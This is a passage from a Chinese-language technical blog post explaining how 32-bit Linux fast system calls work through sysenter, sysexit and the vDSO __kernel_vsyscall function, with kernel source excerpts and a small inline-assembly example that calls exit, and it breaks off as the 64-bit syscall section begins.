&lt;pre&gt;&lt;code&gt;  Prior to executing the SYSENTER instruction, software must specify the privilege level 0 code segment and code entry point, and the privilege level 0 stack segment and stack pointer by writing values to the following MSRs:

• IA32_SYSENTER_CS (MSR address 174H) — The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment. This value is also used to determine the segment selector of the privilege level 0 stack segment (see the Operation section). This value cannot indicate a null selector.

• IA32_SYSENTER_EIP (MSR address 176H) — The value of this MSR is loaded into RIP (thus, this value references the first instruction of the selected operating procedure or routine). In protected mode, only bits 31:0 are loaded.

• IA32_SYSENTER_ESP (MSR address 175H) — The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the privilege level 0 stack). This value cannot represent a non-canonical address. In protected mode, only bits 31:0 are loaded.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;换句话说：为了让内核接收到&lt;code&gt;sysenter&lt;/code&gt;触发的系统调用，内核必须设置3个特殊模块寄存器（MSRs). 其中最重要的是 &lt;code&gt;IA32_SYSENTER_EIP&lt;/code&gt;(地址是0x176). 该MSR代表的是用户程序在执行 &lt;code&gt;sysenter&lt;/code&gt;指令时，内核将要执行的函数地址。&lt;/p&gt;
&lt;p&gt;我们可以在内核代码&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32-setup.c#L240&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso32-setup.c&lt;/code&gt;&lt;/a&gt;中找到写MSR的相关代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void enable_sep_cpu(void)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{&lt;br&gt;        /&lt;em&gt; … other code … &lt;/em&gt;/&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) ia32_sysenter_target, 0);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;MSR_IA32_SYSENTER_EIP&lt;/code&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L54&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/uapi/asm/msr-index.h&lt;/code&gt;&lt;/a&gt;中定义为 &lt;code&gt;0x00000176&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;类似传统软件中断型的系统调用, 使用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用时也定义了一些规范。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L99-L117&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;的注释中可以找到相关内容:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 32bit SYSENTER instruction entry.
 *
 * Arguments:
 * %eax System call number.
 * %ebx Arg1
 * %ecx Arg2
 * %edx Arg3
 * %esi Arg4
 * %edi Arg5
 * %ebp user stack
 * 0(%ebp) Arg6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回想一下，传统的系统调用方法包括返回到用户程序的机制：&lt;code&gt;iret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;要理解让&lt;code&gt;sysenter&lt;/code&gt;正确执行的逻辑不太简单，因为不像软件中断,&lt;code&gt;sysenter&lt;/code&gt;并不存储返回地址。&lt;/p&gt;
&lt;p&gt;实际上，在执行&lt;code&gt;sysenter&lt;/code&gt;指令之前，内核要做的一些记录工作都是会随着时间而变化的(如果已经改变了，你就会看到下文中将要描述的bugs了)&lt;/p&gt;
&lt;p&gt;为了兼容未来特性的变化，用户程序使用内核中的函数&lt;br&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;。当调用该函数的进程执行时，会被映射到每个用户进程空间中去。&lt;/p&gt;
&lt;p&gt;这听起来有点诡异。它是内核中的代码，却在用户层执行。&lt;/p&gt;
&lt;p&gt;实际上，&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;是vDSO(virtual Dynamic Shared Object)的一部分，而vDSO允许程序在用户层中执行内核代码。&lt;/p&gt;
&lt;p&gt;后文中会具体介绍什么是vDSO，vDSO做了什么以及工作原理是什么。&lt;/p&gt;
&lt;p&gt;我们先来了解&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;的一些细节。&lt;/p&gt;
&lt;h4 id=&quot;kernel-vsyscall内幕&quot;&gt;&lt;a href=&quot;#kernel-vsyscall内幕&quot; class=&quot;headerlink&quot; title=&quot;_ _kernel_vsyscall内幕&quot;&gt;&lt;/a&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;内幕&lt;/h4&gt;&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数封装了&lt;code&gt;sysenter&lt;/code&gt;调用的规范，定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32/sysenter.S#L31-L40&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso32/sysenter.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__kernel_vsyscall:
.LSTART_vsyscall:
    push %ecx
.Lpush_ecx:
    push %edx
.Lpush_edx:
    push %ebp
.Lenter_kernel:
    movl %esp,%ebp
    sysenter
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;既然是vDSO(也被称为共享库)的一部分，那用户程序是如何在运行时定位该函数地址的呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数的地址被写入到 &lt;a href=&quot;https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ELF 辅助向量&lt;/a&gt;, 用户程序以及库函数(主要指glibc)可以在这里找到其地址并使用。&lt;/p&gt;
&lt;p&gt;以下方法可用来查找ELF辅助向量：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;a href=&quot;http://man7.org/linux/man-pages/man3/getauxval.3.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;getauxval&lt;/code&gt;&lt;/a&gt;函数，带有&lt;code&gt;AT_SYSINFO&lt;/code&gt;参数.&lt;/li&gt;
&lt;li&gt;迭代搜索环境变量,然后从内存中解析这些变量.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一种方法较为简单，但glibc 2.16前的版本不支持。 下文例子中介绍的代码中实现的是第二种方法。&lt;/p&gt;
&lt;p&gt;从有关&lt;code&gt;__kernel_vsyscall&lt;/code&gt;的代码中可以看出，在执行&lt;code&gt;sysenter&lt;/code&gt;指令之前&lt;code&gt;__kernel_vsyscall&lt;/code&gt;会做一些记录工作。&lt;/p&gt;
&lt;p&gt;因此，我们需要做的就是手动利用&lt;code&gt;sysenter&lt;/code&gt;进入到内核中：&lt;/p&gt;
&lt;p&gt;  . 在ELF辅助向量中找到&lt;code&gt;AT_SYSINFO&lt;/code&gt;,也就是&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;被写入的地址&lt;br&gt;  . 像传统系统调用一样，将系统调用号和参数写入寄存器中&lt;br&gt;  . 调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数&lt;/p&gt;
&lt;p&gt;你可能从来没写过属于你自己的&lt;code&gt;sysenter&lt;/code&gt;封装函数，那是因为内核利用&lt;code&gt;sysenter&lt;/code&gt;进入和退出系统调用的规范是会变化的，到那时候你的代码就会崩溃了。&lt;/p&gt;
&lt;p&gt;在开始用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用前，你都要调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;那么，让我们开始吧。&lt;/p&gt;
&lt;h4 id=&quot;自己写汇编使用sysenter&quot;&gt;&lt;a href=&quot;#自己写汇编使用sysenter&quot; class=&quot;headerlink&quot; title=&quot;自己写汇编使用sysenter&quot;&gt;&lt;/a&gt;自己写汇编使用sysenter&lt;/h4&gt;&lt;p&gt;继续利用前面传统系统调用的例子，我们调用&lt;code&gt;exit&lt;/code&gt;，退出状态是42.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exit&lt;/code&gt;的系统调用号是1. 根据前文描述，我们只需要将系统调用号写进&lt;code&gt;eax&lt;/code&gt;寄存器中，并把第一个参数(退出状态)写到&lt;code&gt;ebx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有趣，让那些之前没见过GCC内联汇编代码的人也可以用下面的例子作为参考）&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;elf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[], &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* envp[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Elf32_auxv_t *auxv;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* auxilliary vectors are located after the end of the environment&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * variables&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * check this helpful diagram: https://static.lwn.net/images/2012/auxvec.png&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(*envp++ != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* envp is now pointed at the auxilliary vectors, since we&#39;ve iterated&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * through the environment variables.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (auxv = (Elf32_auxv_t *)envp; auxv-&amp;gt;a_type != AT_NULL; auxv++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;( auxv-&amp;gt;a_type == AT_SYSINFO) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* &lt;span class=&quot;doctag&quot;&gt;NOTE:&lt;/span&gt; in glibc 2.16 and higher you can replace the above code with&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   * a call to getauxval(3):  getauxval(AT_SYSINFO)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;movl %0,  %%eax    \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;movl %1, %%ebx    \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;call *%2          \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (auxv-&amp;gt;a_un.a_val)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;eax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;ebx&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -m32 -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了! 我们利用 &lt;code&gt;sysenter&lt;/code&gt;触发了&lt;code&gt;exit&lt;/code&gt;系统调用，而不需要引发软件中断。&lt;/p&gt;
&lt;h4 id=&quot;内核层面：sysenter入口&quot;&gt;&lt;a href=&quot;#内核层面：sysenter入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：sysenter入口&quot;&gt;&lt;/a&gt;内核层面：&lt;code&gt;sysenter&lt;/code&gt;入口&lt;/h4&gt;&lt;p&gt;目前我们已经知道用户程序如何通过&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数利用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用，下面来看看内核如何利用系统调用号来执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回想前面的章节，内核调用&lt;code&gt;ia32_sysenter_target&lt;/code&gt;来注册系统调用处理函数。&lt;/p&gt;
&lt;p&gt;此函数在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L162-L163&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中以汇编代码实现。我们来看看&lt;code&gt;eax&lt;/code&gt;寄存器中的值是在哪里被用来执行系统调用的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sysenter_dispatch:
    call    *ia32_sys_call_table(,%rax,8)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段代码和前文传统系统调用模式的代码很类似：名为&lt;code&gt;ia32_sys_call_table&lt;/code&gt;的表存储着系统调用号。&lt;/p&gt;
&lt;p&gt;在所有必要的记录工作完成后，传统系统调用模型以及&lt;code&gt;sysenter&lt;/code&gt;系统调用模型采用相同的机制和系统调用表来分配系统调用。&lt;/p&gt;
&lt;p&gt;参照 &lt;code&gt;int $0x80&lt;/code&gt;（内核层面：int $0x80入口这一章节)，可以了解到&lt;code&gt;ia32_sys_call_table&lt;/code&gt; 是如何定义和构造的。&lt;/p&gt;
&lt;p&gt;以上内容就是如何通过&lt;code&gt;sysenter&lt;/code&gt;系统调用进入内核的全部过程。&lt;/p&gt;
&lt;h4 id=&quot;sysexit-从sysenter中返回&quot;&gt;&lt;a href=&quot;#sysexit-从sysenter中返回&quot; class=&quot;headerlink&quot; title=&quot;sysexit: 从sysenter中返回&quot;&gt;&lt;/a&gt;sysexit: 从sysenter中返回&lt;/h4&gt;&lt;p&gt;内核利用&lt;code&gt;sysexit&lt;/code&gt;指令将执行环境恢复到用户程序。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sysexit&lt;/code&gt;指令的使用不像&lt;code&gt;iret&lt;/code&gt;那么直接。调用者需要将返回地址写入&lt;code&gt;rdx&lt;/code&gt;寄存器中，并将栈指针写入&lt;code&gt;rcx&lt;/code&gt;寄存器。&lt;/p&gt;
&lt;p&gt;这就意味着你的代码中需要计算执行环境要返回的地址，保存地址值，并在调用&lt;code&gt;sysexit&lt;/code&gt;前能恢复。&lt;/p&gt;
&lt;p&gt;可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L169-L185&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt; 找到相关代码:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sysexit_from_sys_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        andl    $~TS_COMPAT,TI_status+THREAD_INFO(%rsp,RIP-ARGOFFSET)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* clear IF, that popfq doesn&#39;t enable interrupts early */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        andl  $~&lt;span class=&quot;number&quot;&gt;0x200&lt;/span&gt;,EFLAGS-R11(%rsp)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movl    RIP-R11(%rsp),%edx              &lt;span class=&quot;comment&quot;&gt;/* User %eip */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        CFI_REGISTER rip,rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RESTORE_ARGS &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r8,%r8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r9,%r9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r10,%r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xorq    %r11,%r11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        popfq_cfi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*CFI_RESTORE rflags*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        popq_cfi %rcx                           &lt;span class=&quot;comment&quot;&gt;/* User %esp */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        CFI_REGISTER rsp,rcx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TRACE_IRQS_ON&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ENABLE_INTERRUPTS_SYSEXIT32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;ENABLE_INTERRUPTS_SYSEXIT32&lt;/code&gt;是定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L139-L143&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;的宏，其中含有&lt;code&gt;sysexit&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;好了，你已经知道32位快速系统调用是如何工作的了。&lt;/p&gt;
&lt;h3 id=&quot;64位快速系统调用&quot;&gt;&lt;a href=&quot;#64位快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;64位快速系统调用&quot;&gt;&lt;/a&gt;64位快速系统调用&lt;/h3&gt;&lt;p&gt;下一步之旅就是去探索64位快速系统调用了。其分别利用&lt;code&gt;syscall&lt;/code&gt; 、&lt;code&gt;sysret&lt;/code&gt;指令进入系统调用、从系统调用中返回。&lt;/p&gt;
&lt;h4 id=&quot;syscall-sysret&quot;&gt;&lt;a href=&quot;#syscall-sysret&quot; class=&quot;headerlink&quot; title=&quot;syscall/sysret&quot;&gt;&lt;/a&gt;syscall/sysret&lt;/h4&gt;&lt;p&gt;Intel指令集参考指南解释了&lt;code&gt;syscall&lt;/code&gt;指令是如何工作的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR (after saving the address of the instruction following SYSCALL into RCX).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;换句话说：为了让内核接收到系统调用，内核必须向&lt;code&gt;IA32_LSTAR&lt;/code&gt; MSR注册当系统调用触发时要执行的代码地址。&lt;/p&gt;
